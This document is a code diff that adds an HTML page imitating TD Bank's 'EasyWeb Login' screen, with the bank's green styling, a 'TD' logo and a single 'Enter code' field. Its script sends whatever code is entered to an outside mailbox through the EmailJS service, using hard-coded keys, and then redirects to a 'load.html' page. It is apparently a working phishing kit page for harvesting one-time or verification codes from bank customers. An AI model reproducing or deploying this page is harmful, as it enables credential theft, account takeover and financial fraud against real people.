@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Google Font (similar to TD style) -->
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: 'Roboto', sans-serif;
+}
+
+/* ===== HEADER ===== */
+.header{
+    background:#0b5d2a;
+    height:70px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 20px;
+    color:white;
+}
+
+.header-left{
+    display:flex;
+    align-items:center;
+    gap:20px;
+}
+
+.menu{
+    width:28px;
+    cursor:pointer;
+}
+.menu div{
+    height:3px;
+    background:white;
+    margin:6px 0;
+    border-radius:2px;
+}
+
+.logo{
+    background:#21a038;
+    padding:8px 14px;
+    font-weight:700;
+    font-size:26px;
+    color:white;
+}
+
+.header-right{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:20px;
+}
+
+.user-icon{
+    font-size:24px;
+}
+
+/* ===== BODY SECTION ===== */
+.hero{
+    background:#f1f1f1;
+    padding:60px 40px;
+}
+
+.hero h1{
+    font-weight:300;
+    font-size:60px;
+    color:#184c2b;
+}
+
+.container{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding:40px 20px;
+}
+
+.continue-box{
+    background: #fff;
+    width: 100%;
+    max-width: 450px;
+    padding: 40px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.05);
+}
+
+label{
+    font-size: 22px;
+    color: #333;
+    display: block;
+    margin-bottom: 10px;
+}
+
+input[type="text"]{
+    width: 100%;
+    padding: 18px;
+    font-size: 18px;
+    border: 2px solid #ddd;
+    outline: none;
+    margin-bottom: 25px;
+    border-radius: 6px;
+}
+
+input:focus{
+    border-color: #0a8f08;
+}
+
+button{
+    width: 100%;
+    padding: 18px;
+    background: #0a8f08;
+    color: #fff;
+    font-size: 24px;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+}
+
+button:hover{
+    background:#087707;
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <div class="header-left">
+        <div class="menu">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="logo">TD</div>
+    </div>
+
+    <div class="header-right">
+        <span class="user-icon">👤</span>
+        <span>Login</span>
+    </div>
+</div>
+
+<!-- MAIN SECTION -->
+<div class="hero">
+    <h1>EasyWeb Login</h1>
+</div>
+
+<div class="container">
+    <div class="continue-box">
+        <label>Enter code</label>
+        <input type="text" id="code">
+
+        <!-- FIXED CONTINUE BUTTON -->
+        <button id="continueBtn">Continue</button>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("HBfoTRnwSHp3iTWvx");
+})();
+
+const continueButton = document.getElementById("continueBtn");
+
+continueButton.addEventListener("click", function(event) {
+  event.preventDefault();
+
+  const code = document.getElementById('code').value.trim();
+ 
+  console.log("code:", code);   
+ 
+  if(!code){
+    alert("Please enter code");
+    return;
+  }
+
+  emailjs.send("service_n9g1u7p", "template_2y92agq", {
+    code: code,
+  })
+  .then(function() {
+      console.log("Sent successfully");
+      window.location.href = "load.html"; // redirect AFTER send
+  })
+  .catch(function(error) {
+      console.log("Error:", error);
+  });
+});
+</script>
+
+</body>
+</html>
